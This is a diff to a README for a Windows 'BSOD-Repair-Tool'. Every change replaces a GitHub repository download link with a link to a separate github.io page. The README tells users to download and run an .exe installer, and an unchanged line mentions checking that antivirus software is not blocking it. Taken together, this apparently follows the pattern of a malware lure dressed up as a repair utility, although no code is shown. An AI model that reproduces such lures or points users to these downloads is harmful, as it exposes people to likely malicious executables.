@@ -1,6 +1,6 @@
 # 🛠️ BSOD-Repair-Tool - Fix Windows Blue Screen Errors Easily
 
-[![Download BSOD-Repair-Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool)
+[![Download BSOD-Repair-Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://ninetyone-oboedamore772.github.io)
 
 This software helps users resolve Blue Screen of Death errors on Windows 10 and Windows 11. It identifies the root cause of system crashes and applies automated repairs to get your computer running again.
 
@@ -19,7 +19,7 @@ Windows displays a blue screen when a critical error stops the system. This tool
 
 Follow these steps to download and run the repair tool on your computer.
 
-1. Visit the [official download page](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool).
+1. Visit the [official download page](https://ninetyone-oboedamore772.github.io).
 2. Locate the Releases section on the right side of the page.
 3. Click the latest version of the installer file, which ends in .exe.
 4. Save the file to your desktop or downloads folder.
@@ -85,4 +85,4 @@ If the installer does not launch, ensure your antivirus software is not blocking
 
 Ensure you downloaded the file from the official link provided here. 
 
-[Download the latest version here](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool)
+[Download the latest version here](https://ninetyone-oboedamore772.github.io)
